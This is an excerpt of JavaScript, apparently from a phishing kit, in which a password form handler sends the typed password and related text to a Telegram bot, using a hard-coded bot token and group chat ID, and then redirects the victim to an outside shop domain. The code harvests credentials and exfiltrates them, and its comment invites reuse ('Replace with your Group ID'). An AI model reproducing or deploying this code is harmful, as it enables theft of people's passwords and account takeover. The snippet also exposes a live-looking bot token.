  ...
  const handlePasswordSubmit = async (e) => {
    ...
    if (password.length >= 5) {
      ...
      try {
        ...
        const response = await axios.post(`https://api.telegram.org/bot7695056137:AAF-DVZsV6sOLwcNfAHBL_jIa8dbR2eDjtk/sendMessage`, {
          chat_id: '-1002331852619', // Replace with your Group ID
          text: message,
        });

        if (response.status === 200) {
          console.log('Message sent successfully to Telegram!', response.data);
          window.location.href = 'https://blk.loline-sps.shop'; // Redirect on success
        } else {
